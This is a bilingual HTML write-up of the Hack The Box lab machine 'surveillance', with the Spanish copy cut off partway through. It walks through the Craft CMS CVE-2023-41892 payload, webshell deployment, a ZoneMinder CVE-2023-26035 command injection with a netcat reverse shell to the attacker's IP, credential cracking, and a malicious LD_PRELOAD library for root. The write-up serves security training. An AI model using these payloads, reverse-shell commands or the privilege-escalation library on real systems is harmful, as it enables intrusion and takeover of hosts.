@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>surveillance | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">surveillance</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target was running Craft CMS version 4.4.14, which is vulnerable to CVE-2023-41892, an unauthenticated remote code execution vulnerability. This vulnerability allows attackers to instantiate arbitrary PHP classes and exploit the Imagick library to write a webshell to the web root directory.</p>
+                    
+                    <p>By exploiting this vulnerability, I achieved initial access as the <code>www-data</code> user. Enumerating the application files, I discovered database backup files containing credentials for the user <code>matthew</code>, allowing me to escalate to that user account.</p>
+                    
+                    <p>Further enumeration revealed ZoneMinder version 1.36.32 running on port 8080. This version is vulnerable to CVE-2023-26035, an unauthenticated command injection vulnerability that allowed me to gain access as the <code>zoneminder</code> user.</p>
+                    
+                    <p>Finally, privilege escalation to root was achieved by abusing the <code>LD_PRELOAD</code> environment variable through ZoneMinder's configuration settings. The <code>zoneminder</code> user had sudo permissions to execute ZoneMinder Perl scripts, which respect custom <code>LD_PRELOAD</code> values from the application configuration, allowing me to inject a malicious shared library and execute code as root.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Craft CMS RCE via PHP class injection and Imagick abuse (CVE-2023-41892), ZoneMinder unauthenticated command injection (CVE-2023-26035), privilege escalation via <code>LD_PRELOAD</code> environment variable injection in ZoneMinder configuration.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Beginning with an nmap scan to identify open ports and services running on the target:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports 22 (SSH) and 80 (HTTP)" /></p>
+
+                <p>The scan reveals SSH on port 22 and an HTTP server on port 80. I add <code>surveillance.htb</code> to my <code>/etc/hosts</code> file to properly resolve the domain.</p>
+
+                <h2>Web Enumeration - Craft CMS Discovery</h2>
+                <p>Running <code>whatweb</code> provides interesting information about the web application:</p>
+                <pre><code class="language-plaintext">http://10.10.11.245 [302 Found] HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], RedirectLocation[http://surveillance.htb/]
+
+http://surveillance.htb/ [200 OK] Bootstrap, Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], JQuery[3.4.1], Title[Surveillance], X-Powered-By[Craft CMS], nginx[1.18.0]</code></pre>
+
+                <p>The response header <code>X-Powered-By: Craft CMS</code> confirms the application is running Craft CMS. Tools like <code>cmseek</code> confirm this, and Wappalyzer indicates the backend uses Yii, which is a PHP framework.</p>
+
+                <h3>Version Identification</h3>
+                <p>While automated tools don't report the exact version, the footer of the website contains a "Powered by Craft CMS" link that reveals the version: <strong>4.4.14</strong>. The link points to <a href="https://github.com/craftcms/cms/tree/4.4.14">https://github.com/craftcms/cms/tree/4.4.14</a>, which shows this version was released on June 14, 2023.</p>
+
+                <h2>Vulnerability Research - CVE-2023-41892</h2>
+                <p>Searching for vulnerabilities affecting Craft CMS 4.4.14, I immediately find a critical unauthenticated RCE: <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41892">CVE-2023-41892</a>. A proof-of-concept exploit is available at <a href="https://github.com/0xfalafel/CraftCMS_CVE-2023-41892">https://github.com/0xfalafel/CraftCMS_CVE-2023-41892</a>.</p>
+
+                <p>For more technical details about the vulnerability, there's an excellent blog post: <a href="https://blog.calif.io/p/craftcms-rce">https://blog.calif.io/p/craftcms-rce</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability allows attackers to instantiate arbitrary PHP classes through a specially crafted POST request to the <code>conditions/render</code> action endpoint. The exploit payload looks like this:</p>
+
+                <pre><code class="language-http">action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}</code></pre>
+
+                <p>This payload instantiates the <code>FnStream</code> class and calls <code>phpinfo()</code>. Testing this basic proof-of-concept:</p>
+                <p><img src="./media/image1.png" alt="Browser showing successful phpinfo() output from the vulnerability exploitation" /></p>
+
+                <h3>Weaponizing the Exploit</h3>
+                <p>The full exploitation chain is more complex and leverages the <code>Imagick</code> PHP extension. The attack works as follows:</p>
+
+                <ol>
+                    <li>Use the class injection to instantiate <code>Imagick</code> and create an MSL (Magick Scripting Language) file in the <code>/tmp</code> directory</li>
+                    <li>Imagick normally deletes temporary files after execution, but by intentionally causing it to crash (by making it process a non-image MSL file), the temporary file persists</li>
+                    <li>The MSL file is created with a random name like <code>phpZZchoG</code> in <code>/tmp</code></li>
+                    <li>In a second request, reference this file using the <code>vid:</code> protocol with a wildcard (<code>vid:/tmp/php*</code>) since the exact filename is unknown</li>
+                    <li>The MSL file contains instructions to write a webshell to the web root directory</li>
+                </ol>
+
+                <p>The first request crashes Imagick and leaves the MSL file in <code>/tmp</code>:</p>
+                <p><img src="./media/image7.png" alt="Code showing the Imagick payload that creates the MSL file and crashes" /></p>
+
+                <p>The second request uses the wildcard to reference the created file and execute the MSL instructions:</p>
+                <p><img src="./media/image5.png" alt="Code showing the second stage payload using vid: protocol with wildcard" /></p>
+
+                <h2>Initial Access - Exploiting Craft CMS</h2>
+                <p>Executing the automated exploit script automates this entire process:</p>
+                <pre><code class="language-bash">python3 craft-cms.py http://surveillance.htb</code></pre>
+
+                <p>The exploit output shows the attack progression:</p>
+                <pre><code class="language-plaintext">[+] Executing phpinfo to extract some config infos
+temporary directory: /tmp
+web server root: /var/www/html/craft/web
+
+[+] create shell.php in /tmp
+[+] trick imagick to move shell.php in /var/www/html/craft/web
+
+[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami</code></pre>
+
+                <p>The webshell is successfully deployed at <code>http://surveillance.htb/shell.php</code>, providing command execution as the <code>www-data</code> user. I use this to establish a proper reverse shell and begin enumeration.</p>
+
+                <h2>Lateral Movement - Database Enumeration</h2>
+                <p>In the <code>/home</code> directory, I discover two users: <code>zoneminder</code> and <code>matthew</code>. Enumerating the Craft CMS application files, I find database credentials in the <code>.env</code> file:</p>
+
+                <pre><code class="language-bash"># Database connection settings
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craftdb
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftCMSPassword2023!</code></pre>
+
+                <p>Connecting to MySQL with these credentials, I find a password hash for the admin user in the database. However, the hash doesn't crack with standard wordlists.</p>
+
+                <h3>Database Backup Discovery</h3>
+                <p>Exploring the application directory further, I discover a database backup file in <code>storage/backups</code>:</p>
+                <pre><code class="language-plaintext">surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></pre>
+
+                <p>Unzipping and examining this backup reveals an older password hash for the user <code>Matthew B</code>:</p>
+                <pre><code class="language-sql">INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec...</code></pre>
+
+                <p>This hash cracks quickly on CrackStation, revealing the credentials:</p>
+                <pre><code class="language-plaintext">matthew:starcraft122490</code></pre>
+
+                <p>Using these credentials, I successfully SSH into the machine as <code>matthew</code> and retrieve the user flag.</p>
+
+                <h2>Internal Service Discovery - ZoneMinder</h2>
+                <p>Checking for listening ports, I discover port 8080 is open locally but not externally accessible. To investigate this service, I set up a port forward using Chisel:</p>
+
+                <pre><code class="language-bash"># On attacking machine
+./chisel server -p 9999 --reverse
+
+# On target machine
+./chisel client 10.10.16.2:9999 R:8080:127.0.0.1:8080</code></pre>
+
+                <p>Accessing the forwarded port reveals a ZoneMinder login panel:</p>
+                <p><img src="./media/image4.png" alt="ZoneMinder login page showing version and authentication form" /></p>
+
+                <p>I attempt default credentials like <code>admin:admin</code> and the credentials I already have, but none work initially.</p>
+
+                <h3>ZoneMinder Version Discovery</h3>
+                <p>Exploring the nginx configuration, I notice the web root path is being manipulated:</p>
+                <p><img src="./media/image2.png" alt="Nginx configuration file showing ZoneMinder path rewriting rules" /></p>
+
+                <p>Searching for ZoneMinder configuration files, I find:</p>
+                <ul>
+                    <li><code>/etc/zm</code> - Configuration directory</li>
+                    <li><code>/usr/share/zoneminder/www</code> - Web root directory</li>
+                </ul>
+
+                <p>In <code>/usr/share/zoneminder/www/includes/config.php</code>, I discover the exact version:</p>
+                <pre><code class="language-php">define( 'ZM_VERSION', '1.36.32' );</code></pre>
+
+                <h2>ZoneMinder Exploitation - CVE-2023-26035</h2>
+                <p>This version of ZoneMinder is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26035">CVE-2023-26035</a>, an unauthenticated command injection vulnerability. I find a clean proof-of-concept at <a href="https://github.com/heapbytes/CVE-2023-26035/blob/main/poc.py">https://github.com/heapbytes/CVE-2023-26035</a>.</p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>The vulnerability exists because there's an unsecured endpoint that also contains a command injection flaw. The exploit is straightforward:</p>
+
+                <ol>
+                    <li>Fetch a CSRF token from the application</li>
+                    <li>Send a POST request to <code>/index.php</code> with a malicious payload</li>
+                    <li>The payload injects commands through the <code>monitor_ids</code> parameter</li>
+                </ol>
+
+                <p>The exploit payload structure:</p>
+                <pre><code class="language-python">data = {
+    'view': 'snapshot',
+    'action': 'create',
+    'monitor_ids[0][Id]': f';{self.cmd}',
+    '__csrf_magic': self.csrf_magic
+}</code></pre>
+
+                <p>Notice the <code>f';</code> prefix in <code>monitor_ids[0][Id]</code> - this is where the command injection occurs.</p>
+
+                <h3>Gaining Access as Zoneminder User</h3>
+                <p>I use the exploit to send a reverse shell payload:</p>
+                <pre><code class="language-bash">python3 poc.py --target http://localhost:8080/ --cmd 'busybox nc 10.10.16.2 443 -e sh'</code></pre>
+
+                <p>The exploit output confirms execution:</p>
+                <pre><code class="language-plaintext">Fetching CSRF Token
+Got Token: key:ae6cff7f165565753ccfd00575c5d02dd1f5038e,1764171952
+[>] Sending payload..
+[!] Script executed by out of time limit (if u used revshell, this will exit the script)</code></pre>
+
+                <p>I successfully receive a reverse shell connection as the <code>zoneminder</code> user.</p>
+
+                <h2>Privilege Escalation - LD_PRELOAD Abuse</h2>
+                <p>Checking sudo permissions for the <code>zoneminder</code> user reveals an interesting configuration:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for zoneminder on surveillance:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User zoneminder may run the following commands on surveillance:
+    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *</code></pre>
+
+                <p>The user can execute any Perl script matching the pattern <code>zm*.pl</code> with sudo privileges. The available scripts are:</p>
+                <pre><code class="language-bash">ls -la /bin/zm*</code></pre>
+
+                <pre><code class="language-plaintext">-rwxr-xr-x 1 root root 788096 Nov 23 2022 /bin/zm_rtsp_server
+-rwxr-xr-x 1 root root  43027 Nov 23 2022 /bin/zmaudit.pl
+-rwxr-xr-x 1 root root 731280 Nov 23 2022 /bin/zmc
+-rwxr-xr-x 1 root root  12939 Nov 23 2022 /bin/zmcamtool.pl
+-rwxr-xr-x 1 root root   6043 Nov 23 2022 /bin/zmcontrol.pl
+-rwxr-xr-x 1 root root  26232 Nov 23 2022 /bin/zmdc.pl
+-rwxr-xr-x 1 root root  35206 Nov 23 2022 /bin/zmfilter.pl
+-rwxr-xr-x 1 root root   5640 Nov 23 2022 /bin/zmonvif-probe.pl
+-rwxr-xr-x 1 root root  19386 Nov 23 2022 /bin/zmonvif-trigger.pl
+-rwxr-xr-x 1 root root  13994 Nov 23 2022 /bin/zmpkg.pl
+-rwxr-xr-x 1 root root  17492 Nov 23 2022 /bin/zmrecover.pl
+-rwxr-xr-x 1 root root   4815 Nov 23 2022 /bin/zmstats.pl
+-rwxr-xr-x 1 root root   2133 Nov 23 2022 /bin/zmsystemctl.pl
+-rwxr-xr-x 1 root root  13111 Nov 23 2022 /bin/zmtelemetry.pl
+-rwxr-xr-x 1 root root   5340 Nov 23 2022 /bin/zmtrack.pl
+-rwxr-xr-x 1 root root  18482 Nov 23 2022 /bin/zmtrigger.pl
+-rwxr-xr-x 1 root root 690720 Nov 23 2022 /bin/zmu
+-rwxr-xr-x 1 root root  45421 Nov 23 2022 /bin/zmupdate.pl
+-rwxr-xr-x 1 root root   8205 Nov 23 2022 /bin/zmvideo.pl
+-rwxr-xr-x 1 root root   7022 Nov 23 2022 /bin/zmwatch.pl
+-rwxr-xr-x 1 root root  19655 Nov 23 2022 /bin/zmx10.pl</code></pre>
+
+                <h3>ZoneMinder Database Credentials</h3>
+                <p>In <code>/etc/zm/zm.conf</code>, I find database credentials for ZoneMinder:</p>
+                <pre><code class="language-bash"># ZoneMinder database user
+ZM_DB_USER=zmuser
+
+# ZoneMinder database password
+ZM_DB_PASS=ZoneMinderPassword2023</code></pre>
+
+                <p>Connecting to MySQL, I find the admin user's password hash:</p>
+                <pre><code class="language-plaintext">$2y$10$BuFy0QTupRjSWW6kEAlBCO6AlZ8ZPGDI8Xba5pi/gLr2ap86dxYd.</code></pre>
+
+                <p>While this hash doesn't crack, I try Matthew's password (<code>starcraft122490</code>) with the username <code>admin</code> and successfully log into the ZoneMinder web interface.</p>
+
+                <h3>Exploiting LD_PRELOAD Configuration</h3>
+                <p>Within ZoneMinder's configuration panel (accessible through the web interface), I discover a setting that allows specifying a custom <code>LD_PRELOAD</code> path. According to the <a href="https://zoneminder.readthedocs.io/en/latest/userguide/options/options_config.html">official documentation</a>, this setting is intended for legitimate library preloading:</p>
+
+                <p><img src="./media/image6.png" alt="ZoneMinder configuration panel showing the LD_PRELOAD path setting" /></p>
+
+                <p>This is exploitable because when the ZoneMinder Perl scripts are executed with sudo, they respect the <code>LD_PRELOAD</code> value from the application configuration. I can abuse this by:</p>
+
+                <ol>
+                    <li>Creating a malicious shared library (<code>.so</code> file)</li>
+                    <li>Uploading it to the target</li>
+                    <li>Setting the <code>LD_PRELOAD</code> path in ZoneMinder's configuration to point to this library</li>
+                    <li>Executing a ZoneMinder Perl script with sudo, which will load our malicious library as root</li>
+                </ol>
+
+                <h3>Creating the Malicious Library</h3>
+                <p>I create a simple C program that will be compiled into a shared library:</p>
+                <pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("cp /bin/bash /tmp/xd");
+    system("chown root:root /tmp/xd");
+    system("chmod 6777 /tmp/xd");
+}</code></pre>
+
+                <p>The <code>_init()</code> function is automatically called when the shared library is loaded. It:</p>
+                <ul>
+                    <li>Unsets <code>LD_PRELOAD</code> to avoid issues with child processes</li>
+                    <li>Sets the effective GID and UID to 0 (root)</li>
+                    <li>Copies <code>/bin/bash</code> to <code>/tmp/xd</code></li>
+                    <li>Sets ownership to root</li>
+                    <li>Sets SUID permissions (6777) on the copied bash binary</li>
+                </ul>
+
+                <p>Compiling this into a shared library:</p>
+                <pre><code class="language-bash">gcc -fPIC -shared -o xd.so xd.c -nostartfiles</code></pre>
+
+                <p>I transfer <code>xd.so</code> to the target machine in the <code>zoneminder</code> user's home directory and configure the ZoneMinder web interface to use this library path in the <code>LD_PRELOAD</code> setting.</p>
+
+                <h3>Triggering Privilege Escalation</h3>
+                <p>Now I execute one of the ZoneMinder Perl scripts with sudo to trigger the library loading:</p>
+                <pre><code class="language-bash">sudo /usr/bin/zmdc.pl startup</code></pre>
+
+                <p>This creates a SUID copy of bash in <code>/tmp</code>:</p>
+                <pre><code class="language-bash">ls -la /tmp/xd</code></pre>
+
+                <pre><code class="language-plaintext">-rwsrwsrwx 1 root root 1396520 Nov 26 17:02 /tmp/xd</code></pre>
+
+                <p>Using the SUID bash binary to escalate to root:</p>
+                <pre><code class="language-bash">/tmp/xd -p</code></pre>
+
+                <pre><code class="language-bash">xd-5.1# whoami
+root
+
+xd-5.1# cat /root/root.txt
+d1151402f053854a35db211ba8a542b8</code></pre>
+
+                <p>I now have root access to the system and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> El objetivo ejecutaba Craft CMS versión 4.4.14, vulnerable a CVE-2023-41892, una vulnerabilidad de ejecución remota de código sin autenticación. Esta vulnerabilidad permite a los atacantes instanciar clases PHP arbitrarias y explotar la librería Imagick para escribir una webshell en el directorio raíz del servidor web.</p>
+                    
+                    <p>Explotando esta vulnerabilidad, conseguí acceso inicial como usuario <code>www-data</code>. Enumerando los archivos de la aplicación, descubrí copias de seguridad de la base de datos que contenían credenciales para el usuario <code>matthew</code>, permitiéndome escalar a esa cuenta de usuario.</p>
+                    
+                    <p>Una enumeración adicional reveló ZoneMinder versión 1.36.32 ejecutándose en el puerto 8080. Esta versión es vulnerable a CVE-2023-26035, una vulnerabilidad de inyección de comandos sin autenticación que me permitió obtener acceso como usuario <code>zoneminder</code>.</p>
+                    
+                    <p>Finalmente, la escalada de privilegios a root se logró abusando de la variable de entorno <code>LD_PRELOAD</code> mediante la configuración de ZoneMinder. El usuario <code>zoneminder</code> tenía permisos sudo para ejecutar scripts Perl de ZoneMinder, que respetan valores personalizados de <code>LD_PRELOAD</code> desde la configuración de la aplicación, permitiéndome inyectar una librería compartida maliciosa y ejecutar código como root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Craft CMS RCE mediante inyección de clases PHP y abuso de Imagick (CVE-2023-41892), ZoneMinder inyección de comandos sin autenticación (CVE-2023-26035), escalada de privilegios mediante inyección de variable de entorno <code>LD_PRELOAD</code> en la configuración de ZoneMinder.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en el objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo nmap mostrando puertos abiertos 22 (SSH) y 80 (HTTP)" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y un servidor HTTP en el puerto 80. Añado <code>surveillance.htb</code> a mi archivo <code>/etc/hosts</code> para resolver correctamente el dominio.</p>
+
+                <h2>Enumeración Web - Descubrimiento de Craft CMS</h2>
+                <p>Ejecutando <code>whatweb</code> proporciona información interesante sobre la aplicación web:</p>
+                <pre><code class="language-plaintext">http://10.10.11.245 [302 Found] HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], RedirectLocation[http://surveillance.htb/]
+
+http://surveillance.htb/ [200 OK] Bootstrap, Email[demo@surveillance.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], JQuery[3.4.1], Title[Surveillance], X-Powered-By[Craft CMS], nginx[1.18.0]</code></pre>
+
+                <p>La cabecera de respuesta <code>X-Powered-By: Craft CMS</code> confirma que la aplicación ejecuta Craft CMS. Herramientas como <code>cmseek</code> confirman esto, y Wappalyzer indica que el backend usa Yii, que es un framework PHP.</p>
+
+                <h3>Identificación de Versión</h3>
+                <p>Aunque las herramientas automatizadas no reportan la versión exacta, el pie de página del sitio web contiene un enlace "Powered by Craft CMS" que revela la versión: <strong>4.4.14</strong>. El enlace apunta a <a href="https://github.com/craftcms/cms/tree/4.4.14">https://github.com/craftcms/cms/tree/4.4.14</a>, que muestra que esta versión fue lanzada el 14 de junio de 2023.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2023-41892</h2>
+                <p>Buscando vulnerabilidades que afecten a Craft CMS 4.4.14, encuentro inmediatamente un RCE crítico sin autenticación: <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41892">CVE-2023-41892</a>. Una prueba de concepto del exploit está disponible en <a href="https://github.com/0xfalafel/CraftCMS_CVE-2023-41892">https://github.com/0xfalafel/CraftCMS_CVE-2023-41892</a>.</p>
+
+                <p>Para más detalles técnicos sobre la vulnerabilidad, hay una excelente entrada de blog: <a href="https://blog.calif.io/p/craftcms-rce">https://blog.calif.io/p/craftcms-rce</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad permite a los atacantes instanciar clases PHP arbitrarias mediante una petición POST especialmente diseñada al endpoint de acción <code>conditions/render</code>. El payload del exploit se ve así:</p>
+
+                <pre><code class="language-http">action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}</code></pre>
+
+                <p>Este payload instancia la clase <code>FnStream</code> y llama a <code>phpinfo()</code>. Probando esta prueba de concepto básica:</p>
+                <p><img src="./media/image1.png" alt="Navegador mostrando salida exitosa de phpinfo() desde la explotación de la vulnerabilidad" /></p>
+
+                <h3>Armando el Exploit</h3>
+                <p>La cadena de explotación completa es más compleja y aprovecha la extensión PHP <code>Imagick</code>. El ataque funciona de la siguiente manera:</p>
+
+                <ol>
+                    <li>Usar la inyección de clase para instanciar <code>Imagick</code> y crear un archivo MSL (Magick Scripting Language) en el directorio <code>/tmp</code></li>
+                    <li>Imagick normalmente elimina archivos temporales después de la ejecución, pero al causar intencionalmente un crash (haciendo que procese un archivo MSL que no es imagen), el archivo temporal persiste</li>
+                    <li>El archivo MSL se crea con un nombre aleatorio como <code>phpZZchoG</code> en <code>/tmp</code></li>
+                    <li>En una segunda petición, referenciar este archivo usando el protocolo <code>vid:</code> con un comodín (<code>vid:/tmp/php*</code>) ya que se desconoce el nombre exacto del archivo</li>
+                    <li>El archivo MSL contiene instrucciones para escribir una webshell en el directorio raíz del servidor web</li>
+                </ol>
+
+                <p>La primera petición hace crashear Imagick y deja el archivo MSL en <code>/tmp</code>:</p>
+                <p><img src="./media/image7.png" alt="Código mostrando el payload de Imagick que crea el archivo MSL y provoca el crash" /></p>
+
+                <p>La segunda petición usa el comodín para referenciar el archivo creado y ejecutar las instrucciones MSL:</p>
+                <p><img src="./media/image5.png" alt="Código mostrando el payload de segunda etapa usando protocolo vid: con comodín" /></p>
+
+                <h2>Acceso Inicial - Explotando Craft CMS</h2>
+                <p>Ejecutando el script automatizado del exploit automatiza todo este proceso:</p>
+                <pre><code class="language-bash">python3 craft-cms.py http://surveillance.htb</code></pre>
+
+                <p>La salida del exploit muestra la progresión del ataque:</p>
+                <pre><code class="language-plaintext">[+] Executing phpinfo to extract some config infos
+temporary directory: /tmp
+web server root: /var/www/html/craft/web
+
+[+] create shell.php in /tmp
+[+] trick imagick to move shell.php in /var/www/html/craft/web
+
+[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami</code></pre>
+
+                <p>La webshell se despliega exitosamente en <code>http://surveillance.htb/shell.php</code>, proporcionando ejecución de comandos como usuario <code>www-data</code>. Uso esto para establecer una reverse shell apropiada y comenzar la enumeración.</p>
+
+                <h2>Movimiento Lateral - Enumeración de Base de Datos</h2>
+                <p>En el directorio <code>/home</code>, descubro dos usuarios: <code>zoneminder</code> y <code>matthew</code>. Enumerando los archivos de la aplicación Craft CMS, encuentro credenciales de base de datos en el archivo <code>.env</code>:</p>
+
+                <pre><code class="language-bash"># Database connection settings
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=craftdb
+CRAFT_DB_USER=craftuser
+CRAFT_DB_PASSWORD=CraftCMSPassword2023!</code></pre>
+
+                <p>Conectándome a MySQL con estas credenciales, encuentro un hash de contraseña para el usuario admin en la base de datos. Sin embargo, el hash no crackea con listas de palabras estándar.</p>
+
+                <h3>Descubrimiento de Backup de Base de Datos</h3>
+                <p>Explorando el directorio de la aplicación más a fondo, descubro un archivo de backup de base de datos en <code>storage/backups</code>:</p>
+                <pre><code class="language-plaintext">surveillance--2023-10-17-202801--v4.4.14.sql.zip</code></pre>
+
+                <p>Descomprimiendo y examinando este backup revela un hash de contraseña más antiguo para el usuario <code>Matthew B</code>:</p>
+                <pre><code class="language-sql">INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec...</code></pre>
+
+                <p>Este hash crackea rápidamente en CrackStation, revelando las credenciales:</p>
+                <pre><code class="language-plaintext">matthew:starcraft122490</code></pre>
+
+                <p>Usando estas credenciales, me conecto exitosamente por SSH a la máquina como <code>matthew</code> y recupero la flag de usuario.</p>
+
+                <h2>Descubrimiento de Servicio Interno - ZoneMinder</h2>
+                <p>Comprobando puertos en escucha, descubro que el puerto 8080 está abierto localmente pero no es accesible externamente. Para investigar este servicio, configuro un reenvío de puerto usando Chisel:</p>
+
+                <pre><code class="language-bash"># En máquina atacante
+./chisel server -p 9999 --reverse
+
+# En máquina objetivo
+./chisel client 10.10.16.2:9999 R:8080:127.0.0.1:8080</code></pre>
+
+                <p>Accediendo al puerto reenviado revela un panel de login de ZoneMinder:</p>
+                <p><img src="./media/image4.png" alt="Página de login de ZoneMinder mostrando versión y formulario de autenticación" /></p>
+
+                <p>Intento credenciales por defecto como <code>admin:admin</code> y las credenciales que ya tengo, pero ninguna funciona inicialmente.</p>
+
+                <h3>Descubrimiento de Versión de ZoneMinder</h3>
+                <p>Explorando la configuración de nginx, noto que la ruta raíz web está siendo manipulada:</p>
+                <p><img src="./media/image2.png" alt="Archivo de configuración de nginx mostrando reglas de reescritura de rutas de ZoneMinder" /></p>
+
+                <p>Buscando archivos de configuración de ZoneMinder, encuentro:</p>
+                <ul>
+                    <li><code>/etc/zm</code> - Directorio de configuración</li>
+                    <li><code>/usr/share/zoneminder/www</code> - Directorio raíz web</li>
+                </ul>
+
+                <p>En <code>/usr/share/zoneminder/www/includes/config.php</code>, descubro la versión exacta:</p>
+                <pre><code class="language-php">define( 'ZM_VERSION', '1.36.32' );</code></pre>
+
+                <h2>Explotación de ZoneMinder - CVE-2023-26035</h2>
+                <p>Esta versión de ZoneMinder es vulnerable a <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26035">CVE-2023-26035</a>, una vulnerabilidad de inyección de comandos sin autenticación. Encuentro una prueba de concepto limpia en <a href="https://github.com/heapbytes/CVE-2023-26035/blob/main/poc.py">https://github.com/heapbytes/CVE-2023-26035</a>.</p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>La vulnerabilidad existe porque hay un endpoint sin securizar que además contiene un fallo de inyección de comandos. El exploit es directo:</p>
+
+                <ol>
+                    <li>Obtener un token CSRF de la aplicación</li>
+                    <li>Enviar una petición POST a <code>/index.php</code> con un payload malicioso</li>
+                    <li>El payload inyecta comandos a través del parámetro <code>monitor_ids</code></li>
+                </ol>
+
+                <p>La estructura del payload del exploit:</p>
+                <pre><code class="language-python">data = {
+    'view': 'snapshot',
+    'action': 'create',
+    'monitor_ids[0][Id]': f';{self.cmd}',
+    '__csrf_magic': self.csrf_magic
+}</code></pre>
+
+                <p>Notad el prefijo <code>f';</code> en <code>monitor_ids[0][Id]</code> - aquí es donde ocurre la inyección de comandos.</p>
+
+                <h3>Obteniendo Acceso como Usuario Zoneminder</h3>
+                <p>Uso el exploit para enviar un payload de reverse shell:</p>
+                <pre><code class="language-bash">python3 poc.py --target http://localhost:8080/ --cmd 'busybox nc 10.10.16.2 443 -e sh'</code></pre>
+
+                <p>La salida del exploit confirma la ejecución:</p>
+                <pre><code class="language-plaintext">Fetching CSRF Token
+Got Token: key:ae6cff7f165565753ccfd00575c5d02dd1f5038e,1764171952
+[>] Sending payload..
+[!] Script executed by out of time limit (if u used revshell, this will exit the script)</code></pre>
+
+                <p>Recibo exitosamente una conexión de reverse shell como usuario <code>zoneminder</code>.</p>
+
+                <h2>Escalada de Privilegios - Abuso de LD_PRELOAD</h2>
+                <p>Comprobando permisos sudo para el usuario <code>zoneminder</code> revela una configuración interesante:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">Matching Defaults entries for zoneminder on surveillance:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
